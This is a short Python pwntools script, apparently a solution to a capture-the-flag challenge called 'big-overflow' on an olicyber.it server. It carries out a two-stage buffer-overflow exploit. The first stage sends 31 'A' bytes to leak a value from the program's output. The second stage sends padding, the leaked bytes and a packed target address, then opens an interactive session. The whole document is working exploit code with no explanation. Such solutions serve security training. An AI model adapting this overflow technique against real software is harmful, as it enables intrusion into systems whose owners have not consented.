from pwn import *

context.arch = 'amd64'
p = remote('big-overflow.challs.olicyber.it', 34003)

payloadstream = b"A"*31
print(p.recvuntil(b"name?"))
p.sendline(payloadstream)
print(p.recvuntil(b"heard "))
stream = p.recvuntil(b"but").lstrip(b"A\n").rstrip(b"but")

payloadflag = b"A"*32 + stream + b"\x00"*2 + p64(0x5ab1bb0)

print(p.recvuntil(b"please:"))
p.sendline(payloadflag)

p.interactive()